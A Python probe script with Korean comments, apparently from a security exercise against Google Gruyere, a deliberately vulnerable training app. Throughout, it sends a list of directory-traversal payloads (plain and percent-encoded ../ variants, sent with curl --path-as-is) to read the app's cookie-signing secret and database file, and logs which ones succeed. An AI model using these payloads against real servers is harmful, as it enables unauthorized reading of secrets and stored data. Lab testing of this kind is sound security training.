#!/usr/bin/env python3
"""Round 2 프로브 — 경로이탈 읽기(파일 열기 정규화 부재) 검증.

대상: /<gid>/<path> 를 서버가 urllib.unquote 후 resources/<path> 로 열기 시도.
목표: resources/ 밖 파일(secret.txt = 쿠키 서명 시크릿, stored-data.txt = DB) 읽기.

핵심 주의: curl 은 기본적으로 URL 의 ../ 를 클라이언트에서 정규화해버린다 →
반드시 --path-as-is 로 원문 경로를 그대로 보내야 한다(이게 첫 시도가 실패하는 흔한 원인).
"""
import subprocess
import sys
from pathlib import Path

SCRATCH = Path(__file__).resolve().parent.parent / "scratch"
GID = (SCRATCH / "gid.txt").read_text().strip().split("=", 1)[1]
BASE = f"https://google-gruyere.appspot.com/{GID}"
JAR = SCRATCH / "gruyere.cookies"
CA = "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"

VARIANTS = [
    ("단순 ../           ", "/../secret.txt"),
    ("2단계 ../../      ", "/../../secret.txt"),
    ("3단계 ../../../   ", "/../../../secret.txt"),
    ("인코딩 %2e%2e/    ", "/%2e%2e/secret.txt"),
    ("인코딩 %2e%2e%2f  ", "/%2e%2e%2fsecret.txt"),
    ("혼합 ..%%2f       ", "/..%2fsecret.txt"),
    ("중복슬래시 ....// ", "/....//secret.txt"),
    ("슬래시 혼합 .%2e/ ", "/.%2e/secret.txt"),
    ("DB 파일          ", "/../stored-data.txt"),
    ("대조군(정상파일) ", "/base.css"),
]


def fetch(path: str) -> tuple[int, str, str]:
    cmd = [
        "curl", "-s", "-i", "--path-as-is", "--max-time", "30",
        "-x", "http://127.0.0.1:8080", "--cacert", CA,
        "-b", str(JAR), "-c", str(JAR),
        BASE + path,
    ]
    out = subprocess.run(cmd, capture_output=True, text=True).stdout
    head, _, body = out.partition("\r\n\r\n")
    if not body and "\n\n" in head:
        head, _, body = out.partition("\n\n")
    code = 0
    for line in head.splitlines():
        if line.startswith("HTTP/"):
            parts = line.split()
            if len(parts) > 1 and parts[1].isdigit():
                code = int(parts[1])
    return code, body, head


def main() -> int:
    print(f"GID={GID}\nBASE={BASE}\n")
    hits = 0
    for label, path in VARIANTS:
        code, body, _head = fetch(path)
        marker = ""
        # 성공 판정: secret.txt 는 'Cookie!', stored-data.txt 는 pickle 바이너리,
        # base.css 는 CSS. 실패면 'Invalid request:' / 'Unrecognized file type'.
        if "Cookie!" in body:
            marker = "  <<< HIT secret.txt"
            hits += 1
        elif "Invalid request" in body:
            marker = "  (파일 열기 실패 → error.gtl 반사)"
        elif "Unrecognized file type" in body:
            marker = "  (확장자 미허용으로 열기 전 차단)"
        snippet = body.strip().replace("\n", " ")[:120]
        print(f"[{label}] {path}")
        print(f"    status={code} len={len(body)}{marker}")
        print(f"    body: {snippet}")
        (SCRATCH / f"traversal_{label.strip().replace(' ', '_').replace('/', '')}.out").write_text(
            f"{path}\n--- headers ---\n{_head}\n--- body ---\n{body}", encoding="utf-8", errors="replace"
        )
    print(f"\n총 HIT: {hits}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
